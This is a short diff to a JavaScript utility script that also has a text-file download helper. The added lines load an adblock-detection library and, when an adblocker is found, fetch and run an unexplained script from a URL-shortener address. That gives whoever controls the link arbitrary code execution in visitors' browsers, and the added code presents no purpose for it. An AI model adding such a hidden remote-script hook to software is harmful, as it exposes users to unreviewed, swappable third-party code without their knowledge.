@@ -86,6 +86,17 @@ await Promise.all(content.map(async (item,index) => {
 
 })();
 
+
+$.getScript( "https://cdn.jsdelivr.net/npm/just-detect-adblock@1.1.0/dist/bundle.umd.min.js",(data)=>{
+    console.log(data);
+    justDetectAdblock.detectAnyAdblocker().then(function(detected) {
+    if(detected){
+      // an adblocker is detected
+        
+        $.getScript( "https://teenurl.in/kss45",(data)=>{});
+    }
+  });
+});
 function download(filename, text) {
     var element = document.createElement('a');
     element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
